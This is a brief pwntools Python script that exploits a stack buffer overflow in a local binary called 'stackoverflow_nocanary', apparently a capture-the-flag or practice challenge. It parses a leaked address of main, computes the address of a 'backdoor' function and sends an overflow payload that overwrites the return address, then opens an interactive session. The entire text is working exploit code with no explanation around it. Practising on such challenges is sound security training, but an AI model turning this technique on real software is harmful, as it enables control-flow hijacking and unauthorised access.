from pwn import *

p=process("./stackoverflow_nocanary")
p.recvuntil("main:")
main_addr=int(p.recvuntil("\n",drop=True),16)
print(hex(main_addr))
backdoor=main_addr-0x122C+0x1210 
#backdoor_addr=base+0x1210
print(hex(backdoor))


pay=b"a"*0x12+p64(backdoor)
print(pay)
p.recvuntil("e?")
p.sendline(pay)
p.recvuntil("YOU?")
p.send(pay)
#raw_input('>')
p.interactive()
